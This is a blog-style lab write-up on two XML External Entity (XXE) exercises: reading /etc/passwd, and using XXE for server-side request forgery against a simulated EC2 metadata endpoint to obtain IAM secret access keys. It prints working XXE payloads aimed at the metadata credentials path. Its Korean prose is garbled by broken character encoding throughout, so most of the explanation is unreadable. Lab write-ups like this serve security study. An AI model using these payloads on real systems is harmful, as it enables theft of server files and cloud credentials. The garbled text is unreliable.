---
title: "[2025-07-08] XXE"
excerpt: "XXE"

categories:
  - Problem
tags:
  - [XXE]

permalink: /Problem/[2025-07-08] XXE/

toc: true
toc_sticky: true

date: 2025-07-07
last_modified_at: 2025-07-07
---

## π¦¥ λ³Έλ¬Έ

### XXE(1)

μ΄ μ‹¤μµμ—λ” XML μ…λ ¥μ„ νμ‹±ν•κ³  μ‘λ‹µμ—μ„ μμƒμΉ λ»ν• κ°’μ„ λ°ν™ν•λ” 'μ¬κ³  ν™•μΈ(Check stock)' κΈ°λ¥μ΄ μμµλ‹λ‹¤. μ΄ μ‹¤μµμ„ ν•΄κ²°ν•λ ¤λ©΄, XML μ™Έλ¶€ μ—”ν‹°ν‹°(XML External Entity, XXE)λ¥Ό μ‚½μ…ν•μ—¬ /etc/passwd νμΌμ λ‚΄μ©μ„ κ°€μ Έμ¤μ„Έμ”.

μ‚¬μ΄νΈλ¥Ό μ²μ λ“¤μ–΄κ°€λ©΄ μ•„λμ™€ κ°™μ€ μ΄λ―Έμ§€κ°€ λ‚νƒ€λ‚λ‹¤
![image.png](../assets/images/posts_img/2025-07-08%20XXE/image.png)
view detailμ„ ν΄λ¦­ν•λ©΄ λ‹¤μκ³Ό κ°™λ‹¤.
![image.png](../assets/images/posts_img/2025-07-08%20XXE/image1.png)

Check stockμ„ ν΄λ¦­ν•μ—¬ μΈν„°μ…‰νΈ ν•λ©΄ λ‹¤μκ³Ό κ°™μ€ Requestλ¥Ό λ³΄λ‚Έλ‹¤. 
![image.png](../assets/images/posts_img/2025-07-08%20XXE/image%20copy.png)
XML λ°©μ‹μΌλ΅ λ³΄λ‚΄λ” λ° μ΄ Requestλ¥Ό Repeaterλ΅ λ³΄λ‚΄μ„ λ‹¤μκ³Ό κ°™μ΄ λ³΄λ‚΄λ©΄ λΉ„λ°€λ²νΈλ¥Ό μ–»μ„ μ μλ‹¤.
![image.png](../assets/images/posts_img/2025-07-08%20XXE/image%20copy%202.png)

### XXE(2)

μ΄ μ‹¤μµμ—λ” XML μ…λ ¥μ„ νμ‹±ν•κ³ , μ‘λ‹µμ— μμƒμΉ λ»ν• κ°’μ„ ν¬ν•¨ν•μ—¬ λ°ν™ν•λ” "μ¬κ³  ν™•μΈ(Check stock)" κΈ°λ¥μ΄ μμµλ‹λ‹¤.

μ‹¤μµ μ„λ²„λ” κΈ°λ³Έ μ£Όμ†μΈ http://169.254.169.254/μ—μ„ μ‹¤ν–‰λλ” (λ¨μλ) EC2 λ©”νƒ€λ°μ΄ν„° μ—”λ“ν¬μΈνΈλ¥Ό κ°€μ§€κ³  μμµλ‹λ‹¤. μ΄ μ—”λ“ν¬μΈνΈλ” ν•΄λ‹Ή μΈμ¤ν„΄μ¤μ— λ€ν• λ°μ΄ν„°λ¥Ό μ΅°νν•λ” λ° μ‚¬μ©ν•  μ μμΌλ©°, μΌλ¶€ μ •λ³΄λ” λ―Όκ°ν•  μ μμµλ‹λ‹¤.

μ΄ μ‹¤μµμ„ ν•΄κ²°ν•λ ¤λ©΄, XXE μ·¨μ•½μ μ„ μ΄μ©ν•μ—¬ SSRF(Server-Side Request Forgery) κ³µκ²©μ„ μν–‰ν•κ³ , EC2 λ©”νƒ€λ°μ΄ν„° μ—”λ“ν¬μΈνΈλ΅λ¶€ν„° μ„λ²„μ **IAM λΉ„λ°€ μ ‘κ·Ό ν‚¤(secret access key)**λ¥Ό νλ“ν•΄μ•Ό ν•©λ‹λ‹¤.

μ„μ™€ λΉ„μ·ν• μ‚¬μ΄νΈλ΅ Check Stockμ„ ν΄λ¦­ν•μ—¬ Requestλ¥Ό μΈν„°μ…‰νΈν•λ©΄ μ„κ³Ό κ°™μ€ Requestκ°€ λ‚μ¨λ‹¤.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```
μ„μ™€ κ°™μ΄ λ³΄λ‚΄λ©΄ ν•΄λ‹Ή κ³„μ •μ„ μ• μ μλ‹¤. Resλ¥Ό λ³΄λ©΄ adminμΈ κ²ƒμ„ μ• μ μλ‹¤.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<stockCheck>
  <productId>&xxe;</productId>
</stockCheck>
```

μ„μ™€ κ°™μ΄ λ³΄λ‚΄λ©΄ key κ°’λ“¤μ„ λ¨λ‘ λ³Ό μ μκ² λλ‹¤. 
![image.png](../assets/images/posts_img/2025-07-08%20XXE/image2.png)